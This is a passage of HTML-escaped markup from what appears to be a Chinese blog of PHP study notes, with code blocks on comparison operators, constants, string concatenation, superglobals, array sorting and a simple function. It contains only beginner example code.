&lt;span class=&#34;token function&#34;&gt;var_dump&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;token constant&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;&#34;&#34; === null: &#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token function&#34;&gt;var_dump&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;===&lt;/span&gt; &lt;span class=&#34;token constant&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;

&lt;span class=&#34;token comment&#34;&gt;/*
//松散比较：使用两个等号 == 比较，只比较值，不比较类型。 //严格比较：用三个等号 === 比较，除了比较值，也比较类型。 0 == false: bool(true) 0 === false: bool(false) 0 == null: bool(true) 0 === null: bool(false) false == null: bool(true) false === null: bool(false) &#34;0&#34; == false: bool(true) &#34;0&#34; === false: bool(false) &#34;0&#34; == null: bool(false) &#34;0&#34; === null: bool(false) &#34;&#34; == false: bool(true) &#34;&#34; === false: bool(false) &#34;&#34; == null: bool(true) &#34;&#34; === null: bool(false)
*/&lt;/span&gt;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;常量&#34;&gt;&lt;a href=&#34;#常量&#34; class=&#34;headerlink&#34; title=&#34;常量&#34;&gt;&lt;/a&gt;常量&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-php&#34; data-language=&#34;php&#34;&gt;&lt;code class=&#34;language-php&#34;&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;// 不区分大小写的常量名&lt;/span&gt;
&lt;span class=&#34;token function&#34;&gt;define&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;GREETING&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;欢迎访问 Runoob.com&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token constant boolean&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; greeting&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;// 输出 &#34;欢迎访问 Runoob.com&#34;&lt;/span&gt;
&lt;span class=&#34;token delimiter important&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;运算符&#34;&gt;&lt;a href=&#34;#运算符&#34; class=&#34;headerlink&#34; title=&#34;运算符&#34;&gt;&lt;/a&gt;运算符&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-php&#34; data-language=&#34;php&#34;&gt;&lt;code class=&#34;language-php&#34;&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$a&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;Hello&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$b&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$a&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34; world!&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$b&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;// 输出Hello world! &lt;/span&gt;
 
&lt;span class=&#34;token variable&#34;&gt;$x&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;Hello&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$x&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.=&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34; world!&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$x&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;// 输出Hello world! &lt;/span&gt;
&lt;span class=&#34;token delimiter important&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;
    
//Hello world!Hello world!&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;pre class=&#34;line-numbers language-php&#34; data-language=&#34;php&#34;&gt;&lt;code class=&#34;language-php&#34;&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$txt1&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;Hello world!&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$txt2&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;What a nice day!&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$txt1&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34; &#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$txt2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token delimiter important&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;超级全局变量&#34;&gt;&lt;a href=&#34;#超级全局变量&#34; class=&#34;headerlink&#34; title=&#34;超级全局变量&#34;&gt;&lt;/a&gt;超级全局变量&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-php&#34; data-language=&#34;php&#34;&gt;&lt;code class=&#34;language-php&#34;&gt;&lt;span class=&#34;token variable&#34;&gt;$GLOBALS&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$_SERVER&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$_REQUEST&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$_POST&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$_GET&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$_FILES&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$_ENV&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$_COOKIE&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$_SESSION&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;数组&#34;&gt;&lt;a href=&#34;#数组&#34; class=&#34;headerlink&#34; title=&#34;数组&#34;&gt;&lt;/a&gt;数组&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-php&#34; data-language=&#34;php&#34;&gt;&lt;code class=&#34;language-php&#34;&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$a&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$b&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;ha&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;lo&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$a&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;count&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$a&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$i&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$i&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;count&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$a&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$i&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$a&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$i&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;&amp;lt;br&amp;gt;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;&amp;lt;br&amp;gt;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$age&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;Peter&#34;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;35&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;Ben&#34;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;37&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;Joe&#34;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;43&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$ages&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;Peter&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;35&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$ages&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;Ben&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;37&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$ages&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;Joe&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;43&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;Peter is &#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$age&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;Peter&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34; years old.&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;foreach&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$age&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;as&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$x&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$x_value&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;Key=&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$x&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;, Value=&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$x_value&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;&amp;lt;br&amp;gt;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;token function&#34;&gt;asort&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$age&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;//键值升序&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;foreach&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$age&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;as&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$x&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$x_value&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;Key=&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$x&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;, Value=&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$x_value&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;&amp;lt;br&amp;gt;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;token function&#34;&gt;arsort&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$age&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;//键值降序&lt;/span&gt;
&lt;span class=&#34;token function&#34;&gt;ksort&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$age&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;//键名升序&lt;/span&gt;
&lt;span class=&#34;token function&#34;&gt;krsort&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$age&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;//键名降序&lt;/span&gt;
&lt;span class=&#34;token function&#34;&gt;sort&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$age&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;

&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;each&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$age&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;函数&#34;&gt;&lt;a href=&#34;#函数&#34; class=&#34;headerlink&#34; title=&#34;函数&#34;&gt;&lt;/a&gt;函数&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-php&#34; data-language=&#34;php&#34;&gt;&lt;code class=&#34;language-php&#34;&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token function-definition function&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$a&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$b&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;????&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$a&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;fuck&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$b&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;you arb bici&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;

